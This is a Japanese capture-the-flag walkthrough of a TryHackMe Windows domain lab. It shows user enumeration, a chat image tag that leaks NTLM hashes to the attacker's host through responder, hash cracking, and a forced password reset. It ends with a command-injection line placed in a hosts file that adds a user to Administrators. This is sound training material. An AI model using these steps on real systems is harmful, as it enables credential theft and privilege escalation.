# Ra CTF

https://tryhackme.com/room/ra

## Enumeration

```shell
TARGET=10.49.132.87
sudo bash -c "echo $TARGET   ra.thm >> /etc/hosts"
```

### ポートスキャン

```sh
# windows
sudo nmap -vv -Pn -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
2179/tcp  open  vmrdp            syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
5222/tcp  open  xmpp-client      syn-ack ttl 128
5223/tcp  open  hpvirtgrp        syn-ack ttl 128
5229/tcp  open  jaxflow          syn-ack ttl 128
5262/tcp  open  unknown          syn-ack ttl 128
5263/tcp  open  unknown          syn-ack ttl 128
5269/tcp  open  xmpp-server      syn-ack ttl 128
5270/tcp  open  xmp              syn-ack ttl 128
5275/tcp  open  unknown          syn-ack ttl 128
5276/tcp  open  unknown          syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
7070/tcp  open  realserver       syn-ack ttl 128
7443/tcp  open  oracleas-https   syn-ack ttl 128
7777/tcp  open  cbt              syn-ack ttl 128
9090/tcp  open  zeus-admin       syn-ack ttl 128
9091/tcp  open  xmltec-xmlmail   syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49674/tcp open  unknown          syn-ack ttl 128
49675/tcp open  unknown          syn-ack ttl 128
49676/tcp open  unknown          syn-ack ttl 128
49697/tcp open  unknown          syn-ack ttl 128
```

```sh
nmap -sV -p53,80,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9090,9091,9389,49670,49674,49675,49676,49697 $TARGET

PORT      STATE SERVICE             VERSION
53/tcp    open  domain?
80/tcp    open  http                Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2026-01-19 01:32:01Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5223/tcp  open  ssl/hpvirtgrp?
5229/tcp  open  jaxflow?
5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5263/tcp  open  ssl/unknown
5269/tcp  open  xmpp                Wildfire XMPP Client
5270/tcp  open  ssl/xmp?
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5276/tcp  open  ssl/unknown
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7070/tcp  open  http                Jetty 9.4.18.v20190429
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
7777/tcp  open  socks5              (No authentication; connection failed)
9090/tcp  open  zeus-admin?
9091/tcp  open  ssl/xmltec-xmlmail?
9389/tcp  open  mc-nmf              .NET Message Framing
49670/tcp open  msrpc               Microsoft Windows RPC
49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc               Microsoft Windows RPC
49676/tcp open  msrpc               Microsoft Windows RPC
49697/tcp open  msrpc               Microsoft Windows RPC
```

HTTPのソースを見て、`windcorp.thm  fire.windcorp.thm` を hostsに追加。

Webで入手したメールアドレス

```
organicfish718@fire.windcorp.thm
organicwolf509@fire.windcorp.thm
tinywolf424@fire.windcorp.thm
angrybird253@fire.windcorp.thm
buse@fire.windcorp.thm
Edeltraut@fire.windcorp.thm
Edward@fire.windcorp.thm
Emile@fire.windcorp.thm
tinygoose102@fire.windcorp.thm
brownostrich284@fire.windcorp.thm
sadswan869@fire.windcorp.thm
sadswan869@fire.windcorp.thm
whiteleopard529@fire.windcorp.thm
happymeercat399@fire.windcorp.thm
orangegorilla428@fire.windcorp.thm
```

### サブドメイン、VHOST

何も出なかった。

```shell
ffuf -u http://windcorp.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.windcorp.thm' -fs 11334
```

kerbruteで有効なユーザーを洗い出し。

```sh
$ ../kerbrute userenum --dc $TARGET -d WINDCORP.thm users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/19/26 - Ronnie Flathers @ropnop

2026/01/19 11:12:53 >  Using KDC(s):
2026/01/19 11:12:53 >   10.49.132.87:88

2026/01/19 11:12:53 >  [+] VALID USERNAME:       Edeltraut@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       angrybird253@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       Edward@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       buse@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       happymeercat399@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       brownostrich284@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       organicfish718@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       orangegorilla428@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       Emile@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       sadswan869@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       whiteleopard529@WINDCORP.thm
2026/01/19 11:12:53 >  [+] VALID USERNAME:       tinygoose102@WINDCORP.thm
2026/01/19 11:12:53 >  Done! Tested 14 usernames (12 valid) in 0.299 seconds
```

有効なユーザー名リスト

```sh
Edeltraut
Edward
Emile
angrybird253
brownostrich284
buse
happymeercat399
orangegorilla428
organicfish718
sadswan869
tinygoose102
whiteleopard529
```

AS-REP Roasting は効かない。

```sh
$ GetNPUsers.py -dc-ip $TARGET WINDCORP.thm/ -usersfile users.txt 
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/myenv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Edeltraut doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Edward doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Emile doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angrybird253 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User brownostrich284 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User buse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User happymeercat399 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User orangegorilla428 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User organicfish718 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sadswan869 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tinygoose102 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User whiteleopard529 doesn't have UF_DONT_REQUIRE_PREAUTH set
```

従業員とペットが移っている写真のファイル名が `lilyleAndSparky.jpg`。  
つまり、ユーザー名が lilyle, ペットの名前が Sparky。

これを使いパスワードリセットを実行。

`Your password has been reset to: ChangeMe#1234`

## SMB

共有一覧

```sh
$ smbclient -L \\$TARGET -U "WINDCORP\lilyle%ChangeMe#1234"

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.153.242 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Users

```sh
$ smbclient //$TARGET/Users -U "WINDCORP\lilyle%ChangeMe#1234"
Try "help" to get a list of possible commands.
smb: \> l
  .                                  DR        0  Sun May  3 07:05:58 2020
  ..                                 DR        0  Sun May  3 07:05:58 2020
  Administrator                       D        0  Sun May 10 20:18:11 2020
  All Users                       DHSrn        0  Sat Sep 15 16:28:48 2018
  angrybird                           D        0  Fri May  1 21:59:20 2020
  berg                                D        0  Fri May  1 21:59:20 2020
  bluefrog579                         D        0  Fri May  1 21:59:20 2020
  brittanycr                          D        0  Sun May  3 08:36:46 2020
  brownostrich284                     D        0  Fri May  1 21:59:20 2020
  buse                                D        0  Mon Jan 19 14:04:54 2026
  Default                           DHR        0  Fri May  1 08:35:11 2020
  Default User                    DHSrn        0  Sat Sep 15 16:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 16:16:48 2018
  edward                              D        0  Fri May  1 21:59:20 2020
  freddy                              D        0  Sun May  3 08:30:16 2020
  garys                               D        0  Fri May  1 21:59:20 2020
  goldencat416                        D        0  Mon Jan 19 14:46:05 2026
  goldenwol                           D        0  Fri May  1 21:59:20 2020
  happ                                D        0  Fri May  1 21:59:20 2020
  happyme                             D        0  Fri May  1 21:59:20 2020
  Luis                                D        0  Fri May  1 21:59:20 2020
  orga                                D        0  Fri May  1 21:59:20 2020
  organicf                            D        0  Fri May  1 21:59:20 2020
  organicfish718                      D        0  Mon Jan 19 14:46:59 2026
  pete                                D        0  Fri May  1 21:59:20 2020
  Public                             DR        0  Thu Apr 30 23:35:47 2020
  purplecat                           D        0  Fri May  1 21:59:20 2020
  purplepanda                         D        0  Fri May  1 21:59:20 2020
  sadswan                             D        0  Fri May  1 21:59:20 2020
  sadswan869                          D        0  Mon Jan 19 14:47:23 2026
  sheela                              D        0  Fri May  1 21:59:20 2020
  silver                              D        0  Fri May  1 21:59:20 2020
  smallf                              D        0  Fri May  1 21:59:20 2020
  spiff                               D        0  Fri May  1 21:59:20 2020
  tinygoos                            D        0  Fri May  1 21:59:20 2020
  whiteleopard                        D        0  Fri May  1 21:59:20 2020

                15587583 blocks of size 4096. 10855614 blocks available
```

Share。フラグ１。

```sh
$ smbclient //$TARGET/Shared -U "WINDCORP\lilyle%ChangeMe#1234"

smb: \> l
  .                                   D        0  Sat May 30 09:45:42 2020
  ..                                  D        0  Sat May 30 09:45:42 2020
  Flag 1.txt                          A       45  Sat May  2 00:32:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 09:45:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 20:06:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 20:05:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 20:07:24 202
```

[spark 2.8.3 の脆弱性](https://github.com/advisories/GHSA-q8gr-rr8w-mwmq)

```
Windows版Ignite Realtime Spark 2.8.3（およびROARプラグイン）に脆弱性が発見されました。チャットメッセージに、外部ホストのIPアドレスを参照するSRC属性を持つIMG要素が含まれる可能性があります。この外部ホストにアクセスすると、ユーザーの(NT)LMハッシュがHTTPリクエストと共に送信されます。これにより、攻撃者はこれらのハッシュを収集・解読し、コンピュータに侵入する可能性があります。（ROARは自動アクセスを設定することもできます。また、ユーザーがクリックすることでアクセスすることも可能です。）
```

インストール＆実行。接続時、Advancedで、下から2番目と3番目にチェックを入れる必要がある。

```sh
$ wine ./spark_2_8_3.exe
$ wine ~/Documents/Spark/Spark.exe
```

`<img src="http://192.168.129.39/test.png">` というチャットをbuseに送信したらリクエストが来た。

```sh
$ sudo responder -I tun0

[HTTP] NTLMv2 Client   : 10.49.153.242
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:343481ce3b00a807:9EF85C5C82C811254EE6BF489904DA29:010[REDACTED]0000
[*] Skipping previously captured hash for WINDCORP\buse
```

buseから0000までの全体をhash.txtとして保存。rockyou.txt でクラックできた。

```sh
$ john ./hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]      (buse)     
1g 0:00:00:05 DONE (2026-01-19 15:38) 0.1697g/s 502438p/s 502438c/s 502438C/s v0yage..uya051
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

evil-winrm で接続成功。

```sh
$ evil-winrm -i 10.49.153.242 -u "WINDCORP\buse" -p "[REDACTED]"
```

フラグ２発見。

```sh
*Evil-WinRM* PS C:\Users\buse> tree /F
Folder PATH listing
Volume serial number is 84E1-0562
C:.
³   .sparkExt.properties
³   sip-communicator.properties
³
ÃÄÄÄ3D Objects
ÃÄÄÄContacts
ÃÄÄÄDesktop
³   ³   Flag 2.txt
³   ³   Notes.txt
³   ³
³   ÃÄÄÄAlso stuff
³   ³       download.jpg
³   ³       fun.jpg
³   ³       maxresdefault.jpg
³   ³
³   ÀÄÄÄStuff
³       ÀÄÄÄPasswords
³               Facebook.txt
³
ÃÄÄÄDocuments
ÃÄÄÄDownloads
ÃÄÄÄFavorites
³   ³   Bing.url
³   ³
³   ÀÄÄÄLinks
ÃÄÄÄLinks
³       Desktop.lnk
³       Downloads.lnk
³
ÃÄÄÄMusic
ÃÄÄÄPictures
ÃÄÄÄSaved Games
ÃÄÄÄSearches
ÀÄÄÄVideos
```

## 権限昇格

PrivescCheck.ps1 を実行したが、特に目立った弱点はなかった。

グループ。`BUILTIN\Account Operators`はアカウントオペレータ用のグループであり、管理者系以外のユーザーのパスワードを設定できる。

```sh
*Evil-WinRM* PS C:\Users\buse\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

C:\scripts\checkservers.ps1

C:\Users\brittanycr\hosts.txt を変更できればコマンドインジェクションが可能。buseのままではアクセスできない。

```sh
$ cat ./checkservers.ps1   
# reset the lists of hosts prior to looping 
$OutageHosts = $Null 
# specify the time you want email notifications resent for hosts that are down 
$EmailTimeOut = 30 
# specify the time you want to cycle through your host lists. 
$SleepTimeOut = 45 
# specify the maximum hosts that can be down before the script is aborted 
$MaxOutageCount = 10 
# specify who gets notified 
$notificationto = "brittanycr@windcorp.thm" 
# specify where the notifications come from 
$notificationfrom = "admin@windcorp.thm" 
# specify the SMTP server 
$smtpserver = "relay.windcorp.thm" 
 
# start looping here 
Do{ 
$available = $Null 
$notavailable = $Null 
Write-Host (Get-Date) 
 
# Read the File with the Hosts every cycle, this way to can add/remove hosts 
# from the list without touching the script/scheduled task,  
# also hash/comment (#) out any hosts that are going for maintenance or are down. 
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |   
ForEach-Object { 
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p 
if($p) 
    { 
     # if the Host is available then just write it to the screen 
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White 
     [Array]$available += $_ 
    } 
else 
    { 
     # If the host is unavailable, give a warning to screen 
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White 
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue 
     if(!($p)) 
       { 
        # If the host is still unavailable for 4 full pings, write error and send email 
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White 
        [Array]$notavailable += $_ 
 
        if ($OutageHosts -ne $Null) 
            { 
                if (!$OutageHosts.ContainsKey($_)) 
                { 
                 # First time down add to the list and send email 
                 Write-Host "$_ Is not in the OutageHosts list, first time down" 
                 $OutageHosts.Add($_,(get-date)) 
                 $Now = Get-date 
                 $Body = "$_ has not responded for 5 pings at $Now" 
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
                  -Subject "Host $_ is down" -SmtpServer $smtpserver 
                } 
                else 
                { 
                    # If the host is in the list do nothing for 1 hour and then remove from the list. 
                    Write-Host "$_ Is in the OutageHosts list" 
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut) 
                    {$OutageHosts.Remove($_)} 
                } 
            } 
        else 
            { 
                # First time down create the list and send email 
                Write-Host "Adding $_ to OutageHosts." 
                $OutageHosts = @{$_=(get-date)} 
                $Body = "$_ has not responded for 5 pings at $Now"  
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
                 -Subject "Host $_ is down" -SmtpServer $smtpserver 
            }  
       } 
    } 
} 
# Report to screen the details 
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count 
Write-Host "Not available count:"$notavailable.count 
Write-Host "Not available hosts:" 
$OutageHosts 
Write-Host "" 
Write-Host "Sleeping $SleepTimeOut seconds" 
sleep $SleepTimeOut 
if ($OutageHosts.Count -gt $MaxOutageCount) 
{ 
    # If there are more than a certain number of host down in an hour abort the script. 
    $Exit = $True 
    $body = $OutageHosts | Out-String 
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom ` 
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer 
} 
} 
while ($Exit -ne $True)
```

brittanycr のパスワード変更

```sh
net user brittanycr thm1234#
```

hosts.txt をダウンロード。

```sh
$ smbclient //10.49.153.242/Users -U "WINDCORP\brittanycr%thm1234#"
Try "help" to get a list of possible commands.
smb: \> cd brittanycr
smb: \brittanycr\> dir
  .                                   D        0  Sun May  3 08:36:46 2020
  ..                                  D        0  Sun May  3 08:36:46 2020
  hosts.txt                           A       22  Sun May  3 22:44:57 2020

                15587583 blocks of size 4096. 10848334 blocks available
smb: \brittanycr\> get hosts.txt
getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

コードインジェクションを仕込んでアップロード。

```sh
$ cat hosts.txt   
google.com; net localgroup Administrators buse /add
```

buse が管理者グループに追加された。

```sh
*Evil-WinRM* PS C:\scripts> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
buse
Domain Admins
Enterprise Admins
The command completed successfully.
```

再接続してフラグ3を入手。

```sh
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2020   1:22 AM             47 Flag3.txt
```

## 振り返り

- 画像ファイル名にユーザー名とペットの名前が含まれるのは盲点だった。
- `BUILTIN\Account Operators` グループは管理者以外のユーザーのパスワードを設定できる。

## Tags

#tags:Windows #tags:Kerberos #tags:responder
